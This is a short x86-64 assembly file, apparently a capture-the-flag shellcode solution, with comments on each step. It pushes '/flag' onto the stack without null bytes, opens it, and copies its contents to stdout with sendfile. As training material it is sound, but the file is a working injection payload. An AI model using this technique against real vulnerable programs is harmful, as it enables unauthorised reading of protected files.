.global _start
_start:
    .intel_syntax noprefix

    xor rbx, rbx
    mov ebx, 0x67616c66	    # push "/flag => 0x2f666c6167" filename
    shl rbx, 8
    mov bl, 0x2f
    push rbx
    xor rax, rax
    mov al, 2				# syscall number of open
    mov rdi, rsp			# point the first argument at stack (where we have "/flag")
    xor rsi, rsi			# NULL out the second argument (meaning, O_RDONLY)
    syscall			        # trigger open("/flag", NULL)
    
    xor rdi,rdi
    mov dil, 1				# first argument to sendfile is the file descriptor to output to (stdout)
    mov rsi, rax			# second argument is the file descriptor returned by open
    xor rdx, rdx			# third argument is the number of bytes to skip from the input file
    mov r10w, 1000			# fourth argument is the number of bytes to transfer to the output file
    xor rax, rax
    mov al, 40				# syscall number of sendfile
    syscall				    # trigger sendfile(1, fd, 0, 1000)
    
    xor rdi, rdi
    xor rax, rax
    mov al, 60				# syscall number of exit
    syscall

